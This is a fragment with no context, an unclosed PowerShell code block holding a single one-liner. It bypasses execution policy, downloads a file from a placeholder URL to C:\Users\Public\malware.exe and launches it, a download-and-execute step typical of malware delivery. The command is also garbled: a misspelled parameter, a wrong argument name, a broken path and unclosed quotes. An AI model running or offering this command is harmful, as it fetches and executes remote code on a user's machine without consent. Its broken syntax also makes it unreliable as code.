...
```powershell
powershell -ExecutionPolicy Bypass -Noprofile -Comman "invoke-Webrequest -URL 'http here' -Outfile 'C:\Users\Public\malware.exe'; Start-Process 'C\Users\Public\malware.exe'
